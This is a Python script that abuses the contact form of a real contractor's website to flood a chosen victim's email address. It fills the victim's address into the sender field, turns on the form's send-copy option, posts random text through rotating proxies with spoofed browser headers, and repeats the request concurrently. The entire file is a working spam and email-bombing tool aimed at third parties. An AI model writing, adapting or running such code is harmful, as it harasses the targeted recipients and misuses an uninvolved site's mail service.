from os.path import basename

import requests

from module import Spam

cookies = {
    '_ga': 'GA1.2.433534377.1676987687',
    '_gid': 'GA1.2.859047536.1676987687',
    '_gat': '1',
}

headers = {
    'authority': 'www.agcglasscontractors.com',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.agcglasscontractors.com',
    'referer': 'https://www.agcglasscontractors.com/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'sendername': self.get_text(),
            'senderemail': target,
            'sendersubject': self.get_text(),
            'sendermessage': self.get_text(),
            'sendcopy': 'sendcopy',
        }

        response = requests.post('https://www.agcglasscontractors.com/php/smartprocess.php', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'successfully')
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
